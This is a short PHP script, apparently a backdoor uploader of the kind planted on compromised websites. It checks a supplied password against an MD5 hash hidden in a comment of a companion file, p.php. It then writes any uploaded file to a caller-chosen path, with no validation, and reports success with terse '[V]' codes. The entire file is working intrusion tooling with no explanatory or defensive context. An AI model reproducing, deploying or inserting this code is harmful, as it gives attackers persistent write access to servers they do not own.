<?php /*23.09.16 
upload
new.php?s=pass~url~type~prav 
*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
if(!isset($_POST['s'])){exit('[X]');}
$d=explode('*/',file_get_contents('./p.php'));
$d=explode('/*',$d[0]);$s=explode('~',$_POST['s']); 
if(md5($s[0])!=$d[1]){exit('[X] PASS');}$d = array();

if($s[1]==''){$s[1]='.';}
   if(is_uploaded_file($_FILES['myfile']['tmp_name']))
   {
		move_uploaded_file($_FILES['myfile']['tmp_name'], $s[1].'/'.$_FILES['myfile']['name']);
		echo '[V]';
   } else {
		echo '[V]';
   }
echo ' upload ' . $_FILES['myfile']['name'];

?>